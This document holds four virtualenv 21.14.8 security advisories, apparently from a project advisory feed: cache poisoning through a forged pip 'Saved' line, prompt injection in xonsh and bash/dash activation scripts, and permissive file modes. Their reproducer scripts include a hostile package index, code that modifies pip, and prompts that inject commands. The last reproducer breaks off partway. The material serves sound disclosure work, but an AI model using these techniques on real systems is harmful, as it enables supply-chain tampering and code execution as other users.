entry.title: [virtualenv] virtualenv: Downloaded wheel selection and caching precede verification
entry.content:
Summary

Wheel downloads go directly into the reusable wheelhouse, while the verification target is selected from pip's textual output. A verification failure does not remove the downloaded file from that cache.

Anthropic's OSS Scanner reported this as ANT-2026-ST00DRO3 in virtualenv-20261015-005, received on 15 October 2026.

Affected area

Download selection and promotion into the reusable wheel cache.

Attacker-controlled input

A download must fail verification, or the archive selected from pip output must differ from the file later reused. Default-index digest verification must be enabled. Existing custom-index exceptions are outside the promised PyPI comparison.

Affected code

The relevant 21.14.8 source is in wheel download and digest check.

Mechanism

download_wheel() tells pip to write directly into the reusable wheel/house cache. It then selects a path to hash from the first Saved line in pip's stdout, rather than from the file pip actually placed there. A package index can inject such a line through a discarded link's data-requires-python attribute. A separate failure exists without the forged line: a digest mismatch raises after the downloaded wheel has entered the cache, and the rejected bytes remain there. Later wheel selection does not hash the cached file again.

Reproduction and evidence

The scanner used a local index configured in pip.conf, with PyPI digest comparison still enabled. In the control case it served a modified pip wheel alone. virtualenv --upgrade-embed-wheels refused the mismatch, and a subsequent environment used the bundled pip. In the attack case the index added a link whose data-requires-python contained a forged Saved <path> line pointing at a genuine bundled wheel. The upgrade then exited without a digest error, recorded the modified wheel in its update log, and a later environment's pip --version ran a line added by the index. The reproduction used a known absolute path to the genuine bundled wheel; that prerequisite is part of this variant.

The report also shows that a refused wheel can replace a previously accepted file of the same name in wheel/house, leaving rejected bytes available for later use. It does not claim to bypass TLS or affect the default PyPI setup. The gap follows the digest check added in #3251, first released in 21.7.12. PR #3430 downloads to a private temporary directory, verifies the actual archive, and promotes it only after acceptance.

Attack sequence

sequenceDiagram
    participant I as Configured index
    participant P as pip download
    participant C as wheel/house cache
    participant V as virtualenv digest check
    participant N as New environment
    I->>P: modified wheel and forged Saved line
    P->>C: write modified wheel directly
    P-->>V: stdout names genuine bundled wheel
    V->>V: hash genuine wheel and accept
    V->>C: record modified wheel for reuse
    C->>N: seed modified pip without rehash
    Note over P,C: Even a rejected wheel can remain in the cache

Reproducer files

The following files are from the scanner report for ANT-2026-ST00DRO3. They were tested against commit a857a7823c73 in the scanner image. The repro entrypoint expects companion files under /tmp/repro.d; cases that change user IDs need a disposable root-capable container. The last output line is BUG when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update.

repro

#!/usr/bin/env python3
import atexit
import hashlib
import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

companions = Path("/tmp/repro.d")
work = Path("/tmp/forged-saved-line")
home = work / "home"
app_data = home / ".cache" / "virtualenv"
this_python = f"{sys.version_info.major}.{sys.version_info.minor}"  # the target; each Python has its own update log
update_log_of_pip = app_data / "wheel" / this_python / "embed" / "3" / "pip.json"
virtualenv = [sys.executable, companions / "virtualenv_with_local_pypi_json.py", work / "pypi"]
as_user = {"cwd": home, "env": {"HOME": str(home), "PATH": os.environ["PATH"]}, "capture_output": True, "text": True}
added_code_prints = "code added by the index"  # the line index_serves_modified_pip.py adds to pip/__init__.py


def user_upgrades_seed_wheels_and_creates_env():
    # each case starts from an empty app-data
    shutil.rmtree(app_data, ignore_errors=True)
    shutil.rmtree(home / "env", ignore_errors=True)
    upgrade = subprocess.run([*virtualenv, "--upgrade-embed-wheels"], **as_user)
    # --no-periodic-update: the background update is another process, which the PyPI stand-in does not reach
    subprocess.run([*virtualenv, "--no-periodic-update", "env"], **as_user, check=True)
    pip_version = subprocess.run([home / "env" / "bin" / "python", "-m", "pip", "--version"], **as_user, check=True)
    # one thread per target Python; a refused wheel ends its thread with a traceback on stderr, the exit code stays 0
    refusal = next((line for line in upgrade.stderr.splitlines() if "but PyPI reports" in line), None)
    logged = []
    if update_log_of_pip.exists():  # a failed update writes no log
        logged = [entry["filename"] for entry in json.loads(update_log_of_pip.read_text())["versions"]]
    return refusal, logged, pip_version.stdout.splitlines()


# set up: PyPI's answers, a faithful mirror of PyPI on 127.0.0.1:8099, a user whose pip.conf points pip at it
shutil.rmtree(work, ignore_errors=True)
(home / ".config" / "pip").mkdir(parents=True)
shutil.copy(companions / "pip.conf", home / ".config" / "pip" / "pip.conf")
subprocess.run([sys.executable, companions / "pypi_json_and_mirror.py", work / "pypi", work / "index"], check=True)
index_server = subprocess.Popen(
    [sys.executable, "-u", "-m", "http.server", "8099", "--bind", "127.0.0.1", "--directory", work / "index"],
    stdout=subprocess.PIPE,
    stderr=subprocess.DEVNULL,
    text=True,
)
atexit.register(index_server.kill)
assert index_server.stdout.readline().startswith("Serving HTTP"), "index server did not start"  # printed once bound

# control: the index serves a modified pip 26.0.1, and virtualenv's comparison with PyPI's SHA-256 refuses it
subprocess.run([sys.executable, companions / "index_serves_modified_pip.py", work / "index"], check=True)
refusal, logged, pip_says = user_upgrades_seed_wheels_and_creates_env()
print("CONTROL  modified pip: --upgrade-embed-wheels refused with:", refusal)
print("CONTROL  modified pip: update log of pip lists", logged)
print("CONTROL  modified pip: pip --version in the new env prints", pip_says)
control_ran_added_code = added_code_prints in "\n".join(pip_says)

# attack: the index also adds one link, whose data-requires-python puts a "Saved <path>" line into pip's output
subprocess.run([sys.executable, companions / "index_forges_saved_line.py", work / "index"], check=True)
refusal, logged, pip_says = user_upgrades_seed_wheels_and_creates_env()
stored_wheel = app_data / "wheel" / "house" / "pip-26.0.1-py3-none-any.whl"
stored_sha256 = hashlib.sha256(stored_wheel.read_bytes()).hexdigest()
pypi_sha256 = json.loads((work / "pypi" / "pip.json").read_text())["releases"]["26.0.1"][0]["digests"]["sha256"]
print("OBSERVED + forged line: --upgrade-embed-wheels refused with:", refusal)
print("OBSERVED + forged line: update log of pip lists", logged)
print("OBSERVED + forged line: sha256 of that wheel in wheel/house:", stored_sha256)
print("OBSERVED + forged line: sha256 PyPI publishes for that name:", pypi_sha256)
print("OBSERVED + forged line: pip --version in the new env prints", pip_says)
attack_ran_added_code = added_code_prints in "\n".join(pip_says)

# check: the same modified wheel, refused without the forged line, is seeded with it
print("BUG" if attack_ran_added_code and not control_ran_added_code else "OK")

repro.d/index_forges_saved_line.py

"""Attacker, as the operator of the index the user's pip.conf names: make pip print a "Saved <path>" line of its choice.

usage: index_forges_saved_line.py <index_dir>

Adds one link to the page of pip; the file behind it is a renamed copy of the genuine pip 26.2.1.
"""

import shutil
import sys
from pathlib import Path

# a genuine PyPI file named pip-26.0.1-py3-none-any.whl on the user's disk: the wheel virtualenv bundles for Python 3.9,
# at the same path for every user of this image
GENUINE_WHEEL_ON_USERS_DISK = "/src/src/virtualenv/seed/wheels/embed/pip-26.0.1-py3-none-any.whl"

index_dir = Path(sys.argv[1])

# named 100.0 while its METADATA says 26.2.1: pip tries it first, then drops it with
# "Discarding <link> (requires-python:<attribute>): ... has inconsistent version" on stdout
shutil.copy(index_dir / "files" / "pip-26.2.1-py3-none-any.whl", index_dir / "files" / "pip-100.0-py3-none-any.whl")

# pip keeps a link whose data-requires-python it cannot parse, and prints the attribute as written; 
 is a line feed
with (index_dir / "simple" / "pip" / "index.html").open("a") as page:
    page.write(
        '<a href="/files/pip-100.0-py3-none-any.whl"'
        f' data-requires-python="
Saved {GENUINE_WHEEL_ON_USERS_DISK}
">pip-100.0-py3-none-any.whl</a>\n'
    )

repro.d/index_serves_modified_pip.py

"""Attacker, as the operator of the index the user's pip.conf names: serve a modified pip under a genuine name.

usage: index_serves_modified_pip.py <index_dir>

pip 26.0.1 on the index gets one more line of code in pip/__init__.py and becomes the only pip on offer. On its own,
virtualenv's comparison with PyPI's SHA-256 catches this.
"""

import hashlib
import io
import sys
import zipfile
from pathlib import Path

ADDED_CODE = b'\nprint("code added by the index runs as uid", __import__("os").getuid())\n'

index_dir = Path(sys.argv[1])
wheel = index_dir / "files" / "pip-26.0.1-py3-none-any.whl"

genuine = zipfile.ZipFile(io.BytesIO(wheel.read_bytes()))
with zipfile.ZipFile(wheel, "w") as modified:
    for entry in genuine.infolist():
        content = genuine.read(entry)
        if entry.filename == "pip/__init__.py":
            content += ADDED_CODE
        modified.writestr(entry, content)

# the #sha256= that every PyPI link carries matters: --upgrade-embed-wheels copies the bundled pip 26.0.1 into pip's
# download folder first, and pip replaces a file of the same name there only when the link's digest differs
sha256 = hashlib.sha256(wheel.read_bytes()).hexdigest()
(index_dir / "simple" / "pip" / "index.html").write_text(
    f'<!DOCTYPE html>\n<a href="/files/{wheel.name}#sha256={sha256}">{wheel.name}</a>\n'
)

repro.d/pip.conf

[global]
index-url = http://127.0.0.1:8099/simple

repro.d/pypi_json_and_mirror.py

"""Setup: what PyPI's JSON API answers for the seed wheels, and an index that mirrors PyPI faithfully.

usage: pypi_json_and_mirror.py <pypi_dir> <index_dir>

The wheels bundled with virtualenv are genuine PyPI files. <pypi_dir>/<project>.json is what
https://pypi.org/pypi/<project>/json answers for them, with the digests of virtualenv's BUNDLE_SHA256 table.
<index_dir> is a PEP 503 tree (simple/<project>/index.html, files/) that offers exactly these files.
"""

import json
import shutil
import sys
import zipfile
from email.parser import HeaderParser
from html import escape
from pathlib import Path

from virtualenv.seed.wheels.embed import BUNDLE_FOLDER, BUNDLE_SHA256

pypi_dir, index_dir = Path(sys.argv[1]), Path(sys.argv[2])
pypi_dir.mkdir()
(index_dir / "files").mkdir(parents=True)

for project in ("pip", "setuptools"):
    releases, links = {}, []
    for filename, sha256 in BUNDLE_SHA256.items():
        name, version = filename.split("-")[:2]
        if name != project:
            continue
        shutil.copy(BUNDLE_FOLDER / filename, index_dir / "files")
        releases[version] = [{"filename": filename, "digests": {"sha256": sha256}, "upload_time": "2026-01-01T00:00:00"}]
        with zipfile.ZipFile(BUNDLE_FOLDER / filename) as wheel:
            metadata = HeaderParser().parsestr(wheel.read(f"{name}-{version}.dist-info/METADATA").decode())
        requires_python = escape(metadata["Requires-Python"])
        links.append(f'<a href="/files/{filename}#sha256={sha256}" data-requires-python="{requires_python}">{filename}</a>')
    (pypi_dir / f"{project}.json").write_text(json.dumps({"releases": releases}))
    (index_dir / "simple" / project).mkdir(parents=True)
    (index_dir / "simple" / project / "index.html").write_text("<!DOCTYPE html>\n" + "\n".join(links) + "\n")

repro.d/virtualenv_with_local_pypi_json.py

"""Setup: the virtualenv command line, with PyPI's JSON API answered from local files because there is no network.

usage: virtualenv_with_local_pypi_json.py <pypi_dir> <virtualenv arguments...>

Only the request for https://pypi.org/pypi/<project>/json is replaced: it is answered from <pypi_dir>/<project>.json.
pip, the index pip talks to and the rest of virtualenv are the real thing.
"""

import sys
from pathlib import Path
from unittest import mock

from virtualenv.__main__ import run_with_catch

pypi_dir = Path(sys.argv[1])


def pypi_json_api(url, context):
    assert url.startswith("https://pypi.org/pypi/") and context is None, url
    project = url.split("/")[4]
    return (pypi_dir / f"{project}.json").open("rb")


with mock.patch("virtualenv.seed.wheels.periodic_update.urlopen", pypi_json_api):
    run_with_catch(sys.argv[2:])

Impact

A file rejected during download verification can remain available for later cache selection. Exploitation requires additional control over the downloaded data or archive selection; this finding alone does not bypass TLS.

Severity: low.

Versions tested

The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected version or exclude earlier releases. Fixed in 21.14.9.

The fix downloads into a private temporary directory and verifies archive identity, requested version, digest where applicable, and Python compatibility before promoting a wheel into the reusable cache.

Fix: PR #3430.

Known mitigation

After a failed verification, discard that download cache before reusing it. Use embedded wheels while reviewing unexpected download failures.

Affected release

  • The problem reproduces on virtualenv 21.14.8.

Credits

Reported by Anthropic's OSS Scanner as ANT-2026-ST00DRO3.

References

  • https://github.com/pypa/virtualenv/security/advisories/GHSA-494p-63j8-28p3
  • https://nvd.nist.gov/vuln/detail/CVE-2026-113714
  • https://github.com/pypa/virtualenv/pull/3430
  • https://github.com/pypa/virtualenv/commit/7babec66e043e1cc8bc66869a063653898719d96

entry.title: [virtualenv] virtualenv: Xonsh activation literals depend on the script decoding codec
entry.content:
Summary

Caller-supplied prompt text can become executable syntax in the xonsh activation script. An attacker must influence the value passed to virtualenv, and a user must subsequently activate the environment.

Affected area

Xonsh reads a UTF-8 activation script using a legacy multibyte encoding such as GBK. Printable non-ASCII bytes can change how the reader recognizes an adjacent quote. The report concerns POSIX activation. It does not establish exposure through unrelated activators.

Attacker-controlled input

The attacker controls prompt or destination data passed as a virtualenv argument. The user later sources the generated activation script.

Affected code

The relevant 21.14.8 source is in xonsh quote(), UTF-8 template writer.

Mechanism

The generator writes activate.xsh as UTF-8. Its quote() used repr(), which leaves printable non-ASCII characters in the file and backslash-escapes an embedded quote. Xonsh's source reads the file using $XONSH_ENCODING. With GBK or Big5, the UTF-8 bytes of 中 end in 0xad, which pairs with the following 0x5c backslash as one decoded character. The backslash no longer escapes the quote. A prompt containing both quote kinds can then close its Python string literal and supply statements that run during activation. With UTF-8 source decoding, the same value stays inside the literal.

Reproduction and evidence

The original scanner finding, ANT-2026-PAUVP7YL, demonstrated this byte-level failure in activate_this.py: a hostile prompt loaded through exec(open(file).read(), ...) under GBK created a marker, while UTF-8 and runpy.run_path controls did not. The xonsh path in this advisory was identified in the subsequent maintainer-provided review. PR #3432 shows the xonsh source-decoding chain and changes quote() to ascii(), which writes non-ASCII characters as escapes. Its regression test encodes the generated literal as ASCII, decodes it as GBK, and checks that ast.literal_eval returns the original prompt.

The attack needs control of the prompt or destination value, an affected xonsh source encoding, and later sourcing of the generated file. The original activate_this.py reproducer does not itself prove xonsh execution; that result is attributed to the separate review. Existing activate.xsh files must be regenerated after the fix.

Attack sequence

sequenceDiagram
    participant A as Prompt supplier
    participant V as virtualenv quote()
    participant F as activate.xsh bytes
    participant X as xonsh source
    A->>V: 中 plus escaped quote and statements
    V->>F: repr writes UTF-8 中 followed by backslash
    alt XONSH_ENCODING is UTF-8
        F->>X: backslash remains an escape
        X-->>A: prompt remains data
    else XONSH_ENCODING is GBK or Big5
        F->>X: decoder consumes backslash as trail byte
        X->>X: quote closes and statements run
    end
    Note over V,X: ascii() emits only ASCII bytes and preserves the literal

Reproducer files

The following files are from the scanner report for ANT-2026-PAUVP7YL. They were tested against commit a857a7823c73 in the scanner image. The repro entrypoint expects companion files under /tmp/repro.d; cases that change user IDs need a disposable root-capable container. The last output line is BUG when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update.

repro

#!/usr/bin/env python3
import os
import subprocess
import sys
from pathlib import Path
from shutil import rmtree

work = Path("/tmp/activate-this-gbk")
rmtree(work, ignore_errors=True)
work.mkdir()
env_dir = work / "venv"
marker = work / "MARKER"

# set up: a zh_CN.GBK locale, which the image does not ship
subprocess.run([sys.executable, "/tmp/repro.d/install_gbk_locale.py", work / "locales"], check=True)
utf8_session = {"PATH": os.environ["PATH"], "LANG": "C.UTF-8"}
gbk_session = {"PATH": os.environ["PATH"], "LANG": "zh_CN.GBK", "LOCPATH": str(work / "locales")}

# attacker: text that a tool relays as --prompt
# the payload's " makes repr() delimit with ' and write the prompt's own ' as \'
# 中 is e4 b8 ad in UTF-8; GBK reads e4 b8 as one character and ad 5c, ad plus that backslash, as the next
payload = f'__import__("os").system("touch {marker}")'
hostile_prompt = "中" + "';" + payload + "#"

# user: creates the environment with the virtualenv command
subprocess.run(["virtualenv", "--quiet", "--no-periodic-update", "--prompt", hostile_prompt, env_dir], check=True)
activate_this = (env_dir / "bin" / "activate_this.py").read_bytes()
prompt_line = next(line for line in activate_this.splitlines() if line.startswith(b'os.environ["VIRTUAL_ENV_PROMPT"]'))
print(f"activate_this.py read as UTF-8: {prompt_line.decode('utf-8')}")
print(f"activate_this.py read as GBK:   {prompt_line.decode('gbk')}")
assert not marker.exists(), "payload ran at creation time"

# trigger: the same program activates the environment, first in a UTF-8 session, then in a GBK one
activate = [sys.executable, "/tmp/repro.d/activate_with_exec_open.py", env_dir]
control = subprocess.run(activate, env=utf8_session, stdout=subprocess.PIPE, encoding="utf-8", check=True)
ran_in_utf8_session = marker.exists()
print(f"CONTROL  UTF-8 session: {control.stdout.strip()}; {marker} exists: {ran_in_utf8_session}")

observed = subprocess.run(activate, env=gbk_session, stdout=subprocess.PIPE, encoding="gbk", check=True)
ran_in_gbk_session = marker.exists()
print(f"OBSERVED GBK session:   {observed.stdout.strip()}; {marker} exists: {ran_in_gbk_session}")

# check: the prompt is data and must not run in either session
print("BUG" if ran_in_gbk_session and not ran_in_utf8_session else "OK")

repro.d/activate_with_exec_open.py

#!/usr/bin/env python3
# usage: activate_with_exec_open.py ENV_DIR
# A program that activates a virtualenv the way activate_this.py's docstring said to until virtualenv 20.26.2.
import locale
import os
import sys

this_file = os.path.join(sys.argv[1], "bin", "activate_this.py")
exec(open(this_file).read(), {"__file__": this_file})

print(f"open() decodes as {locale.getpreferredencoding(False)}, VIRTUAL_ENV_PROMPT is {os.environ['VIRTUAL_ENV_PROMPT']}")

repro.d/install_gbk_locale.py

#!/usr/bin/env python3
# usage: install_gbk_locale.py LOCPATH
# Does what `locale-gen zh_CN.GBK` would; the image has glibc's localedef but no charmap or locale sources.
import os
import subprocess
import sys

locpath = sys.argv[1]
os.makedirs(locpath)

charmap = ["<code_set_name> GBK", "<comment_char> %", "<escape_char> /", "<mb_cur_min> 1", "<mb_cur_max> 2", "CHARMAP"]
charmap += [f"<U{byte:04X}> /x{byte:02x}" for byte in range(0x80)]
for lead in range(0x81, 0xFF):
    for trail in range(0x40, 0xFF):
        try:
            char = bytes([lead, trail]).decode("gbk")
        except UnicodeDecodeError:
            continue
        charmap.append(f"<U{ord(char):04X}> /x{lead:02x}/x{trail:02x}")
charmap.append("END CHARMAP")
with open(f"{locpath}/GBK.charmap", "w") as charmap_file:
    charmap_file.write("\n".join(charmap) + "\n")

# -c: the source has no LC_TIME, LC_MONETARY, ...; localedef fills in defaults, warns and exits 1, so check the result below
source = "/tmp/repro.d/zh_CN_minimal.locale"
subprocess.run(["localedef", "-c", "-f", f"{locpath}/GBK.charmap", "-i", source, f"{locpath}/zh_CN.GBK"], capture_output=True)

gbk_session = {"PATH": os.environ["PATH"], "LANG": "zh_CN.GBK", "LOCPATH": locpath}
codeset = subprocess.run(["locale", "charmap"], env=gbk_session, capture_output=True, text=True, check=True)
if codeset.stdout.strip() != "GBK" or codeset.stderr:
    sys.exit(f"zh_CN.GBK locale not usable: {codeset}")

repro.d/zh_CN_minimal.locale

comment_char %
escape_char /
% Stand-in for glibc's locales/zh_CN: ASCII character classes only. What matters is the codeset name, GBK, which
% comes from the charmap given to localedef with -f.
LC_CTYPE
upper <U0041>..<U005A>
lower <U0061>..<U007A>
digit <U0030>..<U0039>
space <U0009>..<U000D>;<U0020>
cntrl <U0000>..<U001F>;<U007F>
punct <U0021>..<U002F>;<U003A>..<U0040>;<U005B>..<U0060>;<U007B>..<U007E>
xdigit <U0030>..<U0039>;<U0041>..<U0046>;<U0061>..<U0066>
blank <U0009>;<U0020>
END LC_CTYPE
LC_COLLATE
order_start forward
UNDEFINED
order_end
END LC_COLLATE

Impact

An affected activation can execute commands with the user's privileges. Severity is high, following the generated-script precedent in GHSA-p58f-9548-mpm2. The attack requires control of argument data and subsequent user activation; it does not require replacing an executable or controlling app-data contents.

Versions tested

The supplied follow-up review marks command execution as independently confirmed by its author. The implementation review used source inspection and patched literal-value checks, without rerunning that exploit. The relevant activation source is identical between release 21.14.8 and upstream/main 233359cb. The maintainer previously confirmed validation of the reported findings on 21.14.8. The first affected version has not been established. Fixed in 21.14.9.

Known mitigation

Use trusted prompt and destination values. Use UTF-8 source decoding in xonsh on older releases. Recreate environments with virtualenv 21.14.9 or later.

Affected release

  • The problem reproduces on virtualenv 21.14.8.

Credits

The original report was supplied by Anthropic's OSS Scanner as ANT-2026-PAUVP7YL. The subsequent maintainer-provided review identified the remaining activation path.

Additional fix branch

PR #3411 also uses ASCII-only literals for paths and prompts, alongside its activation-state changes. Both branches must retain this quoting rule when integrated.

References

  • https://github.com/pypa/virtualenv/security/advisories/GHSA-394h-qwmc-48pf
  • https://nvd.nist.gov/vuln/detail/CVE-2026-113718
  • https://github.com/pypa/virtualenv/pull/3432
  • https://github.com/pypa/virtualenv/commit/e5fc2e6e189a877ff559af288919e3525d13e5e0
  • https://github.com/pypa/virtualenv/releases/tag/21.14.9

entry.title: [virtualenv] virtualenv: Seeded files retain permissions from an older cache
entry.content:
Summary

The app-data copy seeder uses shutil.copy, which preserves cached file modes independently of the current umask. A cache populated under permissive permissions can therefore produce files with wider access in later environments.

Anthropic's OSS Scanner reported this as ANT-2026-487MH6OW in virtualenv-20261015-005, received on 15 October 2026.

Affected area

Permissions of files copied from app-data into a new environment.

Attacker-controlled input

The cache must contain files created with broader permissions than the current environment creator intends. Another account must also be able to traverse the new environment and reach those files. A private parent directory prevents that access. No control of a private live cache is assumed.

Affected code

The relevant 21.14.8 source is in copy helpers.

Mechanism

The default app-data seeder extracts a wheel into a reusable cache and copies its files into later environments with shutil.copy(). That function applies the cached source mode to each destination file after creating it, overriding the current run's umask. If the cache image was built under umask 000, a later environment created under umask 022 can receive mode-0666 pip files. The cache may be private while the new environment is reachable by other local accounts.

Reproduction and evidence

The scanner created two histories with separate private app-data caches. In the control, the owner's first run used umask 022; a later environment had no files writable by another account, and that account could not append to pip/__init__.py. In the attack history, the first run used umask 000 and the later run still used 022. The report counted 478 of 493 environment files writable by others. A second unprivileged uid appended a line to pip, and bin/pip --version ran it as the environment owner. The cache itself remained under a mode-0700 home in both histories.

An attacker cannot force the owner's earlier umask through this finding; the attack also needs a traversable destination. A mode-002 cache can expose group write access under suitable group permissions. The scanner dates app-data copy seeding to #1578, first released in 20.0.2. PR #3425 creates copied files under a fixed non-writable-by-others policy further restricted by the current umask.

Attack sequence

sequenceDiagram
    participant U as Environment owner
    participant C as Private app-data cache
    participant E as Later environment
    participant A as Other local account
    U->>C: first seed extraction under umask 000
    C-->>U: cached pip files have mode 0666
    U->>E: create environment under umask 022
    C->>E: shutil.copy reapplies mode 0666
    A->>E: append code to pip/__init__.py
    U->>E: run bin/pip --version
    E-->>U: appended code runs as owner

Reproducer files

The following files are from the scanner report for ANT-2026-487MH6OW. They were tested against commit a857a7823c73 in the scanner image. The repro entrypoint expects companion files under /tmp/repro.d; cases that change user IDs need a disposable root-capable container. The last output line is BUG when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update.

repro

#!/usr/bin/env python3
import glob
import os
import shutil
import stat
import subprocess
import sys
from pathlib import Path

sys.stdout.reconfigure(line_buffering=True)  # keep these lines in order with those of the child processes
os.umask(0o022)  # for the directories made here as root
OWNER, OTHER_USER = 1000, 65534  # root is only needed to switch to these two unprivileged uids
VIRTUALENV = ["virtualenv", "--quiet", "--no-periodic-update"]  # default seeder; no network for the update check
# read here, as root: /tmp/repro.d need not be readable by the other user
ATTACK = Path("/tmp/repro.d/other_user_appends_to_pip.py").read_text()


def run_as_owner(command, home, umask):
    environ = {"HOME": str(home), "PATH": os.environ["PATH"]}
    subprocess.run(command, user=OWNER, group=OWNER, extra_groups=[], umask=umask, env=environ, cwd=home, check=True)


def mode(path):
    return stat.filemode(os.stat(path).st_mode)


work = Path("/tmp/seed-mode-repro")
shutil.rmtree(work, ignore_errors=True)
work.mkdir()
proofs = work / "proofs"
proofs.mkdir()
proofs.chmod(0o777)  # the other user's line writes the uid it runs as in here

writable_by_others, appended_line_ran_as = {}, {}
# the two histories differ only in the umask of the owner's earlier run, the one that fills ~/.cache/virtualenv
for case, umask_of_earlier_run in [("CONTROL", 0o022), ("OBSERVED", 0o000)]:
    # set up: the owner's home, and with it the cache, is private; the project folder is reachable by path
    home = work / f"{case}-home"
    home.mkdir(mode=0o700)
    os.chown(home, OWNER, OWNER)
    projects = work / f"{case}-projects"
    projects.mkdir(mode=0o755)
    os.chown(projects, OWNER, OWNER)

    # owner, some time ago: the first run, with an empty cache, extracts the pip wheel into it
    run_as_owner([*VIRTUALENV, str(home / "earlier-env")], home, umask=umask_of_earlier_run)
    # owner, today
    env = projects / "env"
    run_as_owner([*VIRTUALENV, str(env)], home, umask=0o022)

    (cached_pip,) = glob.glob(f"{home}/.cache/virtualenv/wheel/*/image/1/CopyPipInstall/pip-*/pip/__init__.py")
    (seeded_pip,) = glob.glob(f"{env}/lib/python*/site-packages/pip/__init__.py")
    env_files = [path for path in env.rglob("*") if path.is_file() and not path.is_symlink()]
    writable_by_others[case] = sum(1 for path in env_files if path.stat().st_mode & stat.S_IWOTH)
    print(f"{case} earlier run under umask {umask_of_earlier_run:03o}, env created under umask 022")
    print(f"{case}   cache pip/__init__.py  {mode(cached_pip)}")
    print(f"{case}   env   pyvenv.cfg       {mode(env / 'pyvenv.cfg')}")
    print(f"{case}   env   bin/activate     {mode(env / 'bin' / 'activate')}")
    print(f"{case}   env   pip/__init__.py  {mode(seeded_pip)}")
    print(f"{case}   env files writable by others: {writable_by_others[case]} of {len(env_files)}")

    # attack: another local user appends a line to the owner's seeded pip
    proof = proofs / case
    subprocess.run(
        ["python3", "-", str(env), str(proof)],
        input=ATTACK,
        text=True,
        user=OTHER_USER,
        group=OTHER_USER,
        extra_groups=[],
        env={"PATH": os.environ["PATH"]},
        cwd="/",
        check=True,
    )

    # the owner uses the environment
    run_as_owner([str(env / "bin" / "pip"), "--version"], home, umask=0o022)
    appended_line_ran_as[case] = proof.read_text() if proof.exists() else None
    print(f"{case}   other user's line ran as uid: {appended_line_ran_as[case]}")

# check: the same umask 022 today must give the same modes, whatever umask filled the cache earlier
control_is_private = writable_by_others["CONTROL"] == 0 and appended_line_ran_as["CONTROL"] is None
observed_runs_as_owner = writable_by_others["OBSERVED"] > 0 and appended_line_ran_as["OBSERVED"] == str(OWNER)
print("BUG" if control_is_private and observed_runs_as_owner else "OK")

repro.d/other_user_appends_to_pip.py

import glob
import sys

environment, proof = sys.argv[1:]
(pip_init,) = glob.glob(f"{environment}/lib/python*/site-packages/pip/__init__.py")
added_line = f"\nimport os; open({proof!r}, 'w').write(str(os.getuid()))\n"

try:
    with open(pip_init, "a") as pip_source:
        pip_source.write(added_line)
    print(f"other user: appended a line to {pip_init}")
except PermissionError as error:
    print(f"other user: {error}")

Impact

Copied seed files can remain readable or writable by other accounts despite the current umask. Exposure requires those accounts to be able to traverse the destination's parent directories. An attacker need not control the private source cache.

Severity: low.

Versions tested

The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected version or exclude earlier releases. Fixed in 21.14.9.

The fix creates destination files with mode 0644, or 0755 for executable sources, filtered further by the current umask. It does not grant group or world write access, even with a permissive umask. Source modes are not preserved, including modes more restrictive than this creation policy.

Fix: PR #3425.

Known mitigation

Create environments beneath a directory accessible only to their owner. Recreate environments whose permissions were inherited from a permissive cache.

Affected release

  • The problem reproduces on virtualenv 21.14.8.

Credits

Reported by Anthropic's OSS Scanner as ANT-2026-487MH6OW.

entry.title: [virtualenv] virtualenv: Bash prompt values can change meaning under older compatibility modes
entry.content:
Summary

Caller-supplied prompt text can become executable syntax in the bash activation prompt. An attacker must influence the value passed to virtualenv, and a user must subsequently activate the environment and draw the prompt.

Affected area

Bash runs with compatibility level 4.2 and draws the environment prompt. Its replacement-string behavior differs from newer compatibility modes, leaving prompt text subject to a second interpretation. The report concerns POSIX activation. It does not establish exposure through unrelated activators.

Attacker-controlled input

The attacker controls prompt or destination data passed as a virtualenv argument. The user later sources the generated activation script.

Affected code

The relevant 21.14.8 source is in bash prompt assembly.

Mechanism

bin/activate copies the prompt into PS1. A shell expands PS1 again when it draws a prompt, so the value must survive both the assignment and that later expansion. The bash and zsh branches escape for their usual prompt rules. Three other paths still interpret prompt data as commands: dash sourcing activate directly, a child dash inheriting an exported PS1 from bash, and bash running at compatibility level 4.2 or lower. A value such as x$(touch MARKER)y then runs touch on prompt display. Creating the environment does not run the payload.

Reproduction and evidence

The scanner's child-shell reproducer creates an environment with --prompt 'x$(touch MARKER)y', sources bin/activate in interactive bash, and starts interactive sh (dash). Its control leaves PS1 unexported: neither shell creates MARKER. With PS1 exported, bash displays the prompt without executing the value, but the child dash creates MARKER; the reproducer ends in BUG. The report gives separate console reproductions for direct dash activation and bash compatibility level 4.2. The child-shell path can arise after another environment's activation has exported PS1.

The scanner linked this finding to #3326 and its follow-up #3390. Those changes cover the usual bash path but leave the three paths above. The proposed change in #3418 keeps a variable reference in PS1, so prompt text is expanded as data when drawn. The private report's reproducer was run by the scanner; the later command-execution result was supplied by the maintainer review. This advisory does not claim that every POSIX shell or every bash mode is affected.

Introduced

The report traces direct dash sourcing to the first 20.x activator (20.0.0b1), and inherited PS1 to #3390 (first released in 21.14.7). It demonstrates the compatibility-level case on bash 5.2. Those historical boundaries come from the report; the release confirmed by the maintainer is 21.14.8.

Attack sequence

sequenceDiagram
    participant A as Prompt supplier
    participant V as virtualenv
    participant B as Interactive bash
    participant D as Child dash
    A->>V: --prompt x$(touch MARKER)y
    V->>B: generated bin/activate
    B->>B: assign escaped prompt to PS1
    alt PS1 is not exported
        B->>D: start sh with its own PS1
        D-->>B: marker absent
    else PS1 is exported
        B->>D: start sh with inherited PS1
        D->>D: expand $(touch MARKER) on prompt draw
        D-->>B: marker created
    end

Reproducer files

The following files are from the scanner report for ANT-2026-1MOI2X3T. They were tested against commit a857a7823c73 in the scanner image. The repro entrypoint expects companion files under /tmp/repro.d; cases that change user IDs need a disposable root-capable container. The last output line is BUG when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update.

repro

#!/usr/bin/env python3
import shutil
import subprocess
from pathlib import Path

work = Path("/tmp/repro-inherited-ps1")
shutil.rmtree(work, ignore_errors=True)
work.mkdir()
marker = work / "MARKER"
print("sh is", Path("/bin/sh").resolve())

# attacker: only the text a tool such as tox or hatch relays as --prompt
hostile_prompt = f"x$(touch {marker})y"

# set up: the environment, made with the virtualenv command
subprocess.run(
    ["virtualenv", "--no-periodic-update", "--without-pip", "--activators", "bash",
     "--prompt", hostile_prompt, str(work / "env")],
    check=True, stdout=subprocess.DEVNULL,
)
